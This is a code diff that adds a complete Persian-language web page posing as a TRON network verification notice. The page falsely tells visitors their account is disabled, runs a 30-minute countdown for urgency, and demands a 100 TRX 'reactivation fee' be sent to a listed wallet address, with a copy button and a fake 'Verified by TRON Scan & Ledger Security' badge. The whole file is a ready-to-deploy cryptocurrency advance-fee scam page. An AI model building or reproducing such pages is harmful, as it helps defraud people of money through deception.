@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأییدیه شبکه ترون | TRON Verification</title>
+    <style>
+        body { background-color: #0b111a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .kyc-card { background: #1a202c; padding: 25px; border-radius: 20px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .status-badge { background: rgba(255, 19, 19, 0.1); color: #ff0013; padding: 5px 15px; border-radius: 50px; font-size: 13px; margin-bottom: 20px; display: inline-block; }
+        .timer { font-size: 28px; font-weight: bold; color: #ff0013; margin: 10px 0; font-family: monospace; }
+        .instruction { background: rgba(255, 19, 19, 0.05); border-right: 4px solid #ff0013; padding: 15px; border-radius: 8px; font-size: 14px; line-height: 1.6; text-align: right; margin-bottom: 20px; }
+        .address-box { background: #0b111a; padding: 12px; border-radius: 8px; font-size: 13px; word-break: break-all; border: 1px dashed #444; color: #ff0013; cursor: pointer; position: relative; margin-top: 10px; }
+        .btn-verify { width: 100%; padding: 15px; border-radius: 12px; border: none; background-color: #ff0013; color: white; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        .secure-footer { margin-top: 15px; font-size: 10px; color: #4a5568; }
+    </style>
+</head>
+<body>
+
+<div class="kyc-card">
+    <div class="status-badge">وضعیت: محدودیت امنیتی TRC20</div>
+    
+    <div class="timer" id="countdown">30:00</div>
+
+    <div class="instruction">
+        حساب شما در حالت <b>غیرفعال</b> قرار گرفته است. طبق پروتکل‌های جدید شبکه، هزینه نگهداری و فعال‌سازی مجدد نودها باید به مقدار <b>100 TRX</b> واریز گردد.
+    </div>
+
+    <div style="text-align: right;">
+        <span style="font-size: 12px; color: #888;">آدرس اختصاصی واریز (Network: TRON):</span>
+        <div class="address-box" id="wallet-addr" onclick="copyAddr()">
+            TX66axyYXaDuwQczWb6CWDzgCsiEa5J98rk
+        </div>
+    </div>
+
+    <button class="btn-verify" onclick="copyAddr()">کپی آدرس و آزادسازی فوری</button>
+
+    <div class="secure-footer">
+        Verified by TRON Scan & Ledger Security 🔒
+    </div>
+</div>
+
+<script>
+    // تایمر ۳۰ دقیقه ای
+    let time = 1800;
+    const countdownEl = document.getElementById('countdown');
+    setInterval(() => {
+        let minutes = Math.floor(time / 60);
+        let seconds = time % 60;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        countdownEl.innerHTML = `${minutes}:${seconds}`;
+        if (time > 0) time--;
+    }, 1000);
+
+    // تابع کپی آدرس
+    function copyAddr() {
+        var addr = document.getElementById("wallet-addr").innerText.trim();
+        navigator.clipboard.writeText(addr);
+        alert("آدرس کپی شد. پس از واریز 100 ترون، سیستم بلافاصله موجودی شما را آزاد می‌کند.");
+    }
+</script>
+
+</body>
+</html>
